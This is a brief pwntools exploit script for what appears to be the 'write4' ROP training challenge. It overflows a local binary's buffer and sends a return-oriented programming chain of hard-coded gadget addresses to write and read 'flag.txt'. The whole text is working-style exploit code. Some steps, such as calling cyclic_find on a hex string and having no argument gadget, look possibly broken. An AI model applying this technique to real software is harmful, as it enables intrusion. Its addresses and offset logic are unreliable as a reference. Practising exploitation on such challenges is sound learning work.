from pwn import *
context.bits = 64

p = process('./write4') 
p.sendlineafter(">", cyclic(200))
p.wait()
core = p.corefile

offset = cyclic_find(hex(core.rip))

pwn = b'A'*offset
gadget1=p64(0x400690)
r14=p64(0x4006b4)
r15=b"flag.txt"
gadget2=p64(0x400628)
usefunc = p64(0x400617)

p=process('./write4')
p.send(pwn+gadget1+r14+r15+gadget2+usefunc)
p.interactive()
